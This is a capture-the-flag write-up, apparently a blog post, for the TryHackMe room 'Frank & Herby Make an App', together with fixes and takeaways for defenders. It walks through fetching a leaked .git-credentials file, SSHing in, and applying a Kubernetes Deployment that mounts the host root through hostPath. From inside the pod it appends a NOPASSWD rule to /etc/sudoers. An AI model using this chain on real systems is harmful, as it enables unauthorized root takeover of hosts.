@@ -1,0 +1,160 @@
+---
+title: 'Frank & Herby Make an App'
+description: "Leaked Git credentials from an exposed bootstrap-template site give SSH access, then a hostPath-mounting Kubernetes deployment on microk8s is abused to rewrite the host's sudoers file as root."
+date: 2025-12-05
+platform: tryhackme
+room: 'Frank & Herby Make an App'
+roomUrl: 'https://tryhackme.com/room/frankandherby'
+difficulty: medium
+tags:
+  - 'kubernetes'
+  - 'docker'
+  - 'git-leak'
+  - 'container-escape'
+  - 'linux'
+  - 'cve'
+vulnClasses:
+  - 'exposed credentials in version control'
+  - 'privileged container escape'
+  - 'insecure kubernetes rbac'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Frank & Herby Make an App — Leaked Git Credentials to a Kubernetes hostPath Root Escape**
+
+_A walkthrough of the "Frank & Herby Make an App" TryHackMe room. An exposed_ _`.git-credentials`_ _file on a bootstrap-template site leaks SSH access, and a microk8s cluster on the same box is abused through a hostPath-mounting Deployment to rewrite the host's own sudoers file as root._
+
+> The flag is redacted. Frank & Herby Make an App is an authorized training room on TryHackMe; everything here was performed against a legal practice target. Values shown as `<redacted>` are real on the box but withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+A forgotten **`.git-credentials`** file on an nginx bootstrap-template site leaks `frank`'s SSH password in cleartext → SSH in as `frank`, who has no `sudo` rights at all → the box runs a single-node **microk8s** Kubernetes cluster, and an existing Deployment manifest in `frank`'s own repo shows the pattern needed → crafting a Deployment that **mounts the host's root filesystem (\*\***`hostPath: /`\***\*) into a pod** and `exec`-ing into it lets us append a `NOPASSWD: ALL` rule to the **host's** `/etc/sudoers` → `sudo su -` → root.
+
+Leaked git credentials → SSH foothold → hostPath-mount Kubernetes deployment → sudoers rewrite → root.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+```
+
+The box runs SSH (22), a Meteor/[Rocket.Chat](http://rocket.chat/)-style app on 3000, a full microk8s kubelet/API-server port set (10250/10255/10257/10259/16443), a Gunicorn app on 25000, an nginx "Heroic Features" bootstrap template on 31337, and a Docker registry on 32000.
+
+### **The vulnerability: a committed credentials file nobody scrubbed before pushing**
+
+```text
+dirsearch -u http://$IP:31337/
+# /.git-credentials  [Status: 200]
+```
+
+```text
+curl http://$IP:31337/.git-credentials
+# http://frank:<redacted-url-encoded-password>@192.168.100.50
+```
+
+`.git-credentials` stores Git's cached HTTP Basic-Auth credentials in cleartext — `<scheme>://<user>:<password>@<host>` — and this one was left inside the served web root instead of the developer's home directory.
+
+<Callout type="insight">
+
+This is exactly the credential-in-source-control class of bug: a secret that was only ever meant to live in a local, unpublished file ends up reachable over plain HTTP because it was committed — or in this case, just dropped — inside the thing that gets served.
+
+</Callout>
+
+### **Step 1 — SSH in with the leaked credentials**
+
+```text
+ssh frank@$IP
+# password: <redacted> (URL-decoded from the leaked file)
+cat user.txt   # -> THM{<redacted>}
+```
+
+`frank` isn't a `sudo` user and isn't in the `sudo` group, so the usual `sudo -l` dead-ends immediately.
+
+### **Step 2 — enumerating the cluster frank can already talk to**
+
+```text
+microk8s kubectl get all
+# an existing nginx Deployment, NodePort service on 31337
+```
+
+`frank`'s own repo (`~/repos/dk-ml`) contains the Deployment manifest for that running service, and it already demonstrates the exact primitive needed: a `hostPath` volume mount.
+
+### **Step 3 — a hostPath mount turns "create a Deployment" into "read/write the host filesystem"**
+
+This is the well-known **microk8s / Kubernetes hostPath privilege-escalation pattern (CVE-2019-15789 and its many descendants)**: any user who can create a Deployment in an unrestricted cluster can mount an arbitrary host path into a container and read or write it as root — no container-breakout exploit required, because the volume mount _is_ the breakout.
+
+```text
+# exploit.yaml — mounts the host's / into the pod at /opt/root
+spec:
+  containers:
+    - name: nginx
+      image: localhost:32000/bsnginx
+      command: ["/bin/bash","-c","sleep 10000"]
+      volumeMounts:
+        - name: local-stuff
+          mountPath: /opt/root
+  volumes:
+    - name: local-stuff
+      hostPath:
+        path: /
+        type: Directory
+```
+
+```text
+microk8s kubectl delete deploy nginx-deployment   # free resources (optional)
+microk8s kubectl apply -f exploit.yaml
+microk8s kubectl get pod
+microk8s kubectl exec -it <pod-name> /bin/bash
+```
+
+### **Step 4 — editing the host's sudoers file from inside the pod**
+
+```text
+# inside the pod, /opt/root IS the host's /
+cd /opt/root/etc
+echo "frank   ALL=(ALL:ALL) NOPASSWD: ALL" >> sudoers
+exit
+```
+
+Back on the host as `frank`:
+
+```text
+sudo su -
+cat /root/root.txt   # -> THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.9** (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`). Leaked developer credentials chain directly to unrestricted Kubernetes-based root; neither stage required an exploit in the traditional sense:
+
+- **A credentials file served over plain HTTP** handed over a working SSH account with zero authentication guessing.
+- **An unrestricted Kubernetes cluster let a non-privileged local user escalate to root** simply by using a feature (`hostPath` volumes) exactly as designed, on a host it was never meant to be allowed to touch.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Never serve a repository's working directory as a web root.** `.git`, `.git-credentials`, and any dotfile belong outside anything Apache/nginx can reach — and credentials belong in a credential helper or secrets manager, not a cleartext file, regardless of location.
+2. **Restrict who can create workloads in the cluster**, and enforce a `PodSecurityPolicy`/admission-controller rule that blocks arbitrary `hostPath` mounts (or requires them to be read-only and scoped to a specific subpath, never `/`).
+3. **Treat any local user with** **`kubectl`** **access to an unrestricted cluster as root-equivalent**, and gate cluster access the same way you'd gate `sudo`.
+
+</Callout>
+
+### **Takeaways**
+
+- **A credential leak doesn't need a sophisticated exploit to be catastrophic** — a file left in the wrong directory is enough.
+- **`hostPath`** **volumes are a privilege-escalation primitive, not just a convenience feature.** If a user can define Pod specs, and `hostPath` isn't restricted, that user can become root on the node.
+- **"No sudo rights" doesn't mean "no path to root"** when the box runs a container orchestrator with its own, separate trust boundary.
+
+Thanks for reading. Frank & Herby Make an App is a clean example of how a single forgotten credentials file, combined with an under-restricted local Kubernetes cluster, adds up to full host compromise.
